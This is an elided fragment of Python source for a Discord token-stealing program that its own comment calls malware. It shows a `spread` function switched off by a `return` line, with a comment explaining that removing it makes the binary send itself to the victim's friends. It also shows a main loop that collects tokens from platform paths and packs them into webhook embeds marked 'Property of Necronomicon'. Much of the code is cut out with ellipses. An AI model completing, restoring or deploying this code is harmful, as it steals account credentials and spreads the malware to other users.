...
def spread(token, form_data, delay):
    return  # Remove to re-enable (If you remove this line, the malware will spread itself by sending the binary to friends.)
...
def main():
    ...
    for platform, path in PATHS.items():
        ...
        for token in getTokenz(path):
            ...
            embed = {
                ...
                "footer": {
                    "text": f"Property of Necronomicon"
                }
            }
            embeds.append(embed)
    ...
    webhook = {
        ...
        "avatar_url": "https://cdn.discordapp.com/avatars/834163137015971851/f188cd8ee5a8c3d209a19a117d9db4f8.png"
    }
    try:
